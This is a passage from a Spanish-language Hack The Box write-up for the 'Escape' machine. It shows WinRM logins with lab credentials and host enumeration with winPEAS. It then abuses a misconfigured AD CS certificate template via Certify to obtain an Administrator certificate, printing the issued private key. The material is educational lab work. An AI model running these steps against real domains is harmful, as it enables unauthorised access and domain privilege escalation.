+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User Guest doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<h2 id="shell-as-sql_svc">Shell as sql_svc</h2>
+
+<ul>
+  <li>Podemos conectarnos y estamos en la maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> <span class="s1">'sql_svc'</span> <span class="nt">-p</span> <span class="s1">'REGGIE1234ronnie'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>sequel<span class="se">\s</span>ql_svc
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : htb
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::24c
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::9045:a178:c6da:1141
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::9045:a178:c6da:1141%4
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.11.202
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.254.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:a809%4
+                                       10.10.10.2
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="road-to-ryancooper">Road to Ryan.Cooper</h2>
+
+<ul>
+  <li>De primeras no vemos nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Hay vemos todos los usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc&gt; net user
+
+User accounts <span class="k">for</span> <span class="se">\\</span>
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Administrator            Brandon.Brown            Guest
+James.Roberts            krbtgt                   Nicole.Thompson
+Ryan.Cooper              sql_svc                  Tom.Henn
+The <span class="nb">command </span>completed with one or more errors.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Si miramos mas información de nuestro usuario vemos cosas que ya sabemos así que vamos a subir el <code class="language-plaintext highlighter-rouge">Winpeas</code> para enumerar el sistema.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc&gt; net user sql_svc
+User name                    sql_svc
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/18/2022 2:13:13 PM
+Password expires             Never
+Password changeable          11/19/2022 2:13:13 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   6/16/2023 9:39:34 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\sql_svc&gt; 
+</span></code></pre></div></div>
+
+<ul>
+  <li><a href="https://github.com/carlospolop/PEASS-ng/releases">https://github.com/carlospolop/PEASS-ng/releases</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Escape/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe
+                                        
+Data: 2704724 bytes of 2704724 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Después de correr el <code class="language-plaintext highlighter-rouge">Winpeas</code> hay un archivo donde hay un <strong>.BAK</strong> y viene credenciales de otro usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>SQLServer
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\S</span>QLServer
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----         2/7/2023   8:06 AM                Logs
+d-----       11/18/2022   1:37 PM                SQLEXPR_2019
+<span class="nt">-a----</span>       11/18/2022   1:35 PM        6379936 sqlexpress.exe
+<span class="nt">-a----</span>       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer&gt; <span class="nb">cd </span>Logs
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs&gt; 
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/escape/web4.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si filtramos por la <code class="language-plaintext highlighter-rouge">String</code> <strong>Password</strong> vemos que nos muestran las credenciales del Usuario <code class="language-plaintext highlighter-rouge">Ryan.Cooper</code>.</p>
+  </li>
+  <li>
+    <p>Vamos a verificar que sean correctas para ver si podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.11.202 <span class="nt">-u</span> <span class="s1">'Ryan.Cooper'</span> <span class="nt">-p</span> <span class="s1">'NuclearMosquito3'</span>
+SMB         10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+HTTP        10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.202:5985/wsman
+WINRM       10.10.11.202    5985   DC               <span class="o">[</span>+] sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-ryancooper">Shell as Ryan.Cooper</h2>
+
+<ul>
+  <li>Ahora nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> <span class="s1">'Ryan.Cooper'</span> <span class="nt">-p</span> <span class="s1">'NuclearMosquito3'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>sequel<span class="se">\r</span>yan.cooper
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
+3012b1a853be34bc305df5dd4477a3ac
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Después de correr el <code class="language-plaintext highlighter-rouge">winpeas</code> vemos esto que es interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Escape/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe
+                                        
+Data: 2704724 bytes of 2704724 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/escape/web5.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Como nos están hablando sobre certificados y template vamos a subir el siguiete <strong>.exe</strong> a la maquina <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe</a>.</p>
+  </li>
+  <li>
+    <p>Ahora lo vamos a subir ala maquina victima.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; upload Certify.exe
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Escape/content/Certify.exe to C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments<span class="se">\C</span>ertify.exe
+                                              
+Data: 232104 bytes of 232104 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        6/16/2023  11:58 PM         174080 Certify.exe
+<span class="nt">-a----</span>        6/16/2023  11:08 PM        2028544 winPEASx64.exe
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>En este articulo nos explican como usar el <strong>script</strong> <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a>.</p>
+  </li>
+  <li>
+    <p>Ahora corremos el <strong>.exe</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\C</span>ertify.exe find /vulnerable /currentuser
+
+   _____          _   _  __
+  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using current user'</span>s unrolled group SIDs <span class="k">for </span>vulnerability checks.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the search base <span class="s1">'CN=Configuration,DC=sequel,DC=htb'</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing info about the Enterprise CA <span class="s1">'sequel-DC-CA'</span>
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb<span class="se">\s</span>equel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : <span class="nv">CN</span><span class="o">=</span>sequel-DC-CA, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : <span class="nv">CN</span><span class="o">=</span>sequel-DC-CA,DC<span class="o">=</span>sequel,DC<span class="o">=</span>htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY<span class="se">\A</span>uthenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+<span class="o">[!]</span> Vulnerable Certificates Templates :
+
+    CA Name                               : dc.sequel.htb<span class="se">\s</span>equel-DC-CA
+    Template Name                         : UserAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\D</span>omain Users           S-1-5-21-4078382237-1492182817-2568127209-513
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+      Object Control Permissions
+        Owner                       : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+        WriteOwner Principals       : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteDacl Principals        : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteProperty Principals    : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+
+
+
+Certify completed <span class="k">in </span>00:00:10.3938804
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>La herramienta encontró un <strong>Template</strong> vulnerable vamos a seguir instrucciones del link mencionado anteriormente <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a>.</p>
+  </li>
+  <li>
+    <p>Ahora vamos a obtener la clave privada pasandole el template Vulnerable.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\C</span>ertify.exe request /ca:dc.sequel.htb<span class="se">\s</span>equel-DC-CA /template:UserAuthentication /altname:Administrator
+
+   _____          _   _  __
+  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : sequel\Ryan.Cooper
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : UserAuthentication
+[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] AltName                 : Administrator
+
+[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 10
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvYJ0bcEO/Ro+WHZaImNp5S/djZO0czq0JkYwNPtlcQqu20Hx
+i/VPRLnOUoOscqkoejuVn+/iV/y/pCx2oMQrmXJbHmeg2hh8nSDIgO9xq9HRFW7W
+BFy85BYGl0Yw7+Ff8LbApmBSg8qDjdzsFhA0yTrLagb6uKuxLqKPZBJ6JYemzSfC
+qn48LC/wyatA00VAITZA9nAgjGAUxSD9ztzQHR455CWyGwx1xjfWhQmRNH0Uf8Lr
+eQc3+qIxQGeXGJk/1tWc4Y+WWiB7JUbC6U7MOXwK+Mp6SDBJ6rfbRvCx0Hxmh+N/
+QGMcwTcmEvlOwz+1StURbWckj0lDrI/1z2QJ8QIDAQABAoIBAHBkclC1cwJBEkC8
+0HAcra0zWh6hPyAn7LfWYLjLcDo+r71xuqPa9Qw5dlgRp7DJCiyUMgUM7Bxq1e20
+QRbPwVvcKpY5t3ghlaZKzx9I4w2X/nzLozorFgvf1EDbbCKYc6H7gP4rmkR3UtZL
+8+iR6/x8Vi+nvALSMN8LoicjnjWq3LT+mQLcl65OsT+RdI6hYg6hp54Np1+Nd6Ef
+DgJNb0vwadnvWs683nm975ovoTEkQVqFjYJQyOO+Tj4z3fzTBD3imA3U88Wxyebs
+dhvgD3T+FD7O72UFIR+TF93IB97WcZCYthPgwGF7kgwWUObLhcwwg5p+CkkkGlA7
+KlWUu9ECgYEA1q+9t93Z1S7T6k93NCRP6zZVnV9J+XAi4JuaPpPaBjHONlPZN/Fa
+yXqF9QonWZu6VPdEhD6hh8etQOFKCy4NgUNY6AVbCAQ7F4BrbsIXdBc9GeGwP1/I
+55suWcnzhn33dMvBmETGuTCy7kXZqOO7Te2jkR8XjuRCmJ/v6CAzpxcCgYEA4fpn
+0OHW/tOWCovIy72y9nEwbMsllxIyJN1etRrYuw0dp92WttKtPS3ectqnp7EsbiIl
+/L16S7ap5MaxPRXuMNt4jrV/PDLs2QJDOpiDpT2Hnv3XqqqDvn0+yx5NuR8oEs4P
+DC3Ok1c3FMpNYJpvsTZsfYUSkCrQDq+kVLUEfDcCgYBtBNFSjVYQ67axRalC0S3E
+Q9M2Fy15fXg4lsu8+1e7zY7qB6pGvklcBtv/kyhoWKxGeUpR3XwpdzyDtePjyX8S
+JSEAsbeIWp2nUY88r1M5oJNmkTTu+bUL58Gh1uvTYCRJKy8kI8jGQfSbCt185ig3
+anWlPCS6ay9mUdGCDtgsAQKBgQCqDMo0yM4F4ukEtJ38m5rhktmy9Mgrv9iWHzOW
+q0YutDb9zGUO3MjawfqkiWAic9QQaIgXgepWsXV1oANeCXO9tlopYfEGNvg+cVJv
+9LcUEJJPFYxGdJxBK3SmWv538Tcxt3hhXNMX00iyz22c5Xppa6AGcK5AaMc6Vfge
+ej2OzwKBgCI7iYV+FVgPZq5+iXsGNQx47bATgp20RH8X5RDHtqqp388L00OARaBu
+EkAd+7QSePPiv0Xgj9qpEvAq/QKgph7sbsaaxv7YiMA+7qj53dxpKLS5C9qGyVju
+2/pp8ZLKqI3BBCUFVCIgumTf5JeEGeo5n5GT+dZBxtNGKqIZ31rN
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGEjCCBPqgAwIBAgITHgAAAAobYAasNCI4AQAAAAAACjANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjE3MDY1MzMzWhcNMjUwNjE3
+MDcwMzMzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9gnRtwQ79Gj5YdloiY2nlL92N
+k7RzOrQmRjA0+2VxCq7bQfGL9U9Euc5Sg6xyqSh6O5Wf7+JX/L+kLHagxCuZclse
+Z6DaGHydIMiA73Gr0dEVbtYEXLzkFgaXRjDv4V/wtsCmYFKDyoON3OwWEDTJOstq
+Bvq4q7Euoo9kEnolh6bNJ8KqfjwsL/DJq0DTRUAhNkD2cCCMYBTFIP3O3NAdHjnk
+JbIbDHXGN9aFCZE0fRR/wut5Bzf6ojFAZ5cYmT/W1Zzhj5ZaIHslRsLpTsw5fAr4
+ynpIMEnqt9tG8LHQfGaH439AYxzBNyYS+U7DP7VK1RFtZySPSUOsj/XPZAnxAgMB
+AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFC96EBaBGWMYbTjA6+uHLVombe/t
+MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
+IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+AAOCAQEAV6tknxdb31GWT5i9N+ZBWEoY4Rjx3X7yLWKniRDdw6CuUoHnEbmFJnaI
+lW1yVtxgT7q0pKT+NP2Dtmtm74vpIFm67EnIiRXE4lr90Sj0YMW5D0vmX0Ez85VK
+sgb+gLH0G3SaGaL/Jdg+UFpdGn6L76a1c3f6GA3O0yUkTHlexV+onF4Mep4GRpj7
+H9LwQ1VUAUBUyrTnHZwBb/Om0DhfBhw9mY8vwlEgc9Hl+pNhwhy1z2iiLzix261g
+XrYRbHN5xaTcY0aw8kIBYjWPtthGMxRtFgvRygSDJFjVUU9UldrJ4Sz8Sg5vRaOu
+xeozQ1rZp5Ha22SsT63a/x53DNEk6g==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+
+Certify completed in 00:00:13.6637836
